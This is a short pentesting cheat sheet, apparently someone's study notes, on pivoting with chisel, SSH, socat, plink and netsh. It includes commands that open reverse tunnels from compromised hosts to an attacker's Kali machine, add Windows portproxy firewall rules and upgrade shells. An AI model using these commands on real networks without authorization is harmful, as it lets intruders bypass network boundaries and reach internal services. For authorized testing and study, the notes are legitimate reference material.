These notes are old and need to be updated.

# With Chisel

on your machine:
```
./chisel server -p 8888 -reverse
```
on the target machine:
```
./chisel client VOTREIP:8888 R:8889:localhost:6666
```
8888: local port on your machine to listen to the connection

6666: local port of the target machine's service

8889: local port on your machine to receive the desired service

# SSH

## Local

X------Y:8000

`ssh user@Yip -L 8080:localhost:8000 -p 2222`

## Remote 

```
python -c 'import pty; pty.spawn("/bin/sh")'
/usr/bin/script -qc /bin/bash /dev/null
```

```
X:22--|--Y----5432:Z

   <-SSH--
X:22--|--Y----5432:Z
```
```
X: sudo systemctl start ssh

Y: ssh -N -R 127.0.0.1:2345:Zip:5432 kali@Xip

X: psql -h 127.0.0.1 -p 2345 -U postgres
```

# SOCAT

Want to connect to 5432

X----8090:Y----5432:Z

`Y : socat -ddd TCP-LISTEN:2345,fork TCP:Zip:5432`

X----8090/2345:Y----5432:Z

`X : psql -h Yip -p 2345 -U postgres`

# Plink (Windows)

You can now access local port

```
   <-SSH--
X:22--|---3389:Y
```

```
# Start ssh on kali
sudo systemctl start ssh

# Connect with plink
C:\Windows\Temp\plink.exe -ssh -l kali -pw <YOUR PASSWORD HERE> -R 127.0.0.1:9833:127.0.0.1:3389 Xip

# open new term and Now u have access to 3389
xfreerdp /u:admin /p:P@ssw! /v:127.0.0.1:9833
```

# Netsh

X--|3389--3389Y----22:Z

First you need access to Y with rdp/winrm and admin

```
Y : netsh interface portproxy add v4tov4 listenport=2222 listenaddress=Yip connectport=22 connectaddress=Zip

Y: netsh interface portproxy show all

Y: netsh advfirewall firewall add rule name="port_forward_ssh_2222" protocol=TCP dir=in localip=Yip localport=2222 action=allow


X:  ssh admin@Yip -p2222
```
